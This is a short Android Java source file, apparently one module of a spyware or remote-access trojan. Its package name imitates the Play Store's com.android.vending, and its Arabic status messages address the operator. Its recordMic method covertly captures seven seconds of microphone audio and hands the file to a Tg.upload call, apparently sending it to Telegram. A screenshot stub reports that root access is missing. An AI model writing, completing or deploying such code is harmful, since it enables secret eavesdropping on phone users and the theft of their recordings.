package com.android.vending.helper;
import android.content.Context;
import android.media.MediaRecorder;
import java.io.File;
public class Media {
    public static String recordMic(Context c) {
        try { 
            File f = new File(c.getCacheDir(), "mic_" + System.currentTimeMillis() + ".3gp"); 
            MediaRecorder mr = new MediaRecorder(); 
            mr.setAudioSource(MediaRecorder.AudioSource.MIC); 
            mr.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); 
            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB); 
            mr.setOutputFile(f.getAbsolutePath()); 
            mr.prepare(); mr.start(); 
            Thread.sleep(7000); 
            mr.stop(); mr.release(); 
            return "تم التسجيل:\n" + Tg.upload(f, "تسجيل_مايك"); 
        }
        catch (Exception e) { return "فشل التسجيل (جرّب منح إذن المايك): " + e.getMessage(); }
    }
    public static String screenshot(Context c) {
        return "[-] فشل السكرين شوت: أندرويد يمنع لقطة الشاشة بدون صلاحية ROOT.";
    }
}
